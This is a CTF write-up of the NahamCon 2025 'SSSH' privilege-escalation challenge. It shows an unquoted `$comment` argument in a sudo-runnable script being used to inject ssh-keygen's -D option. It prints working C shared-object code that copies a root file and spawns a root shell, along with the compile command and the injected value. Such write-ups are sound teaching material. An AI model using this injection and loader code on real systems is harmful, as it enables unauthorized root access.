---
layout: load_md
title: The White Circle | Nahamcon 2025 | SSSH Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Nahamcon 2025
parent: nahamcon_2025
category: misc
challenge: SSSH
tags: "misc, twh, privesc, gtfobins, ssh, lib2shell"
date: 2025-05-31T00:00:00+00:00
last_modified_at: 2025-05-31T00:00:00+00:00
---

<h1 class="heading card-title white-text">Nahamcon 2025</h1>


## SSSH
> Solved by thewhiteh4t

In this challenge we were given SSH access to an instance which contained a custom bash script which is a SSH key manager script. Running `sudo -l` reveals that our user can run the script as root without a password. This was a privilege escalation challenge.


![](https://i.imgur.com/ZToHz2J.png)


Luckily the code of the script was readable. After reading it for some time one block looked interesting : 


    comment=$(gum input --placeholder "Enter comment for key (optional)" --prompt "Comment: ")
    
        if ! is_valid_input "$comment"; then
            gum style --foreground "$ERROR_FG" --border-foreground "$ERROR_BORDER_FG" --border double --align center --width "$BOX_WIDTH" --margin "$BOX_MARGIN" --padding "$BOX_PADDING" "Invalid comment: Dangerous characters"
            return 1
        fi
    
        if [ -f ~/.ssh/"$key_name" ] || [ -f ~/.ssh/"$key_name.pub" ]; then
            if ! gum confirm "Key ~/.ssh/$key_name already exists. Overwrite?"; then
                return
            fi
            overwrite_flag="-y"
        else
            overwrite_flag=""
        fi
    
        mkdir -p ~/.ssh
        chmod 700 ~/.ssh
    
        if [ -n "$comment" ]; then
            error_output=$(gum spin --spinner dot --title "Generating key in ~/.ssh..." -- \
                ssh-keygen $overwrite_flag -C $comment -t $key_type -f ~/.ssh/"$key_name" -N "$passphrase" 2>&1)
        else
            error_output=$(gum spin --spinner dot --title "Generating key in ~/.ssh..." -- \
                ssh-keygen $overwrite_flag -t $key_type -f ~/.ssh/"$key_name" -N "$passphrase" 2>&1)
        fi

As you must have noticed all the inputs are quoted except one : 


    ssh-keygen $overwrite_flag -C $comment -t $key_type -f ~/.ssh/"$key_name" -N "$passphrase" 2>&1)

`$comment` is left unquoted so we can inject something here.

After a lot of hit and trials I finally realized that `ssh-keygen` offers a privesc vector. You can find more about it here :

[GTFOBins](https://gtfobins.github.io/gtfobins/ssh-keygen/)

Since we can have control over comment argument option we can simply add more arguments, specifically `-D` so that we can execute our malicious shared object `.so` file.

But first I had to figure out how to create a malicious shared object file for ssh-keygen. My search led me to a fork of [lib2shell](https://github.com/jonasheschl/lib2shell-ssh-keygen/blob/master/unix/lib2shell.c) which does exactly what I need. So I used the following code to compile the so file : 


    #include <stdio.h>
    #include <unistd.h>
    
    #define SHELL_PATH "/bin/sh"
    
    void __attribute__ ((constructor)) constructor() {
        puts("[lib2shell by SeanP, modified by Jonas Heschl]");
    
        long long err = execl(SHELL_PATH, SHELL_PATH, "cp /root/flag.txt /home/user/flag.txt; chown user:user /home/user/flag.txt", NULL);
        printf("Result: %lld\n", err);
    }
    
    // ssh-keygen makes a rudimentary check when loading a library with `ssh-keygen -D`.
    // If the check fails, loading is aborted. This function exists to make the check pass.
    int C_GetFunctionList() {
        return 1;
    }

Compiled it using : 


    gcc -fPIC -shared -o twh.so twh.c

and here is the value of comment I used :


    a -D ./twh.so

First I managed to copy the flag from `/root/flag.txt` to `/home/user/flag.txt` but I did not get the flag!


![](https://i.imgur.com/JGHdgr9.png)


So now the goal was to obtain a root shell. The problem was that a simple payload like `/bin/bash -s` was not working since the script uses `gum` which is a kind of wrapper that is used to create the TUI of the script, so the shell spawn was not usable due to messed up input output redirection.

Then I eventually landed on a fix for redirection, alternatively we can also use the bash reverse shell which most are familiar with


    #include <stdio.h>
    #include <unistd.h>
    
    #define SHELL_PATH "/bin/sh"
    
    void __attribute__ ((constructor)) constructor() {
        puts("[lib2shell by SeanP, modified by Jonas Heschl]");
    
        long long err = execl("/bin/bash", "bash", "-c", "bash < /dev/tty > /dev/tty 2>&1 &", NULL);
        printf("Result: %lld\n", err);
    }
    
    int C_GetFunctionList() {
        return 1;
    }

Using the new so file I managed to get a root shell.


![](https://i.imgur.com/xrcbmXv.png)


Then I saw why I did not get flag earlier, because we were supposed to run a binary to get the flag, this was done to increase the complexity of the challenge a bit.


![](https://i.imgur.com/lnlmWcA.png)


**Key Learning and Takeaways**


- Code Review : We had the script's code, which is a blessing in CTFs. The key was to read through it slowly while understanding what each line is doing.
- GTFOBins : When you find a command that can be run as root, your next stop should be GTFOBins. It's an incredible resource that lists known ways to abuse common binaries for privilege escalation.
- Crafting the Malicious Shared Object : This was the truly technical part! We needed a specific .so file that would execute a shell for us when loaded. Finding and adapting a lib2shell fork was fun.

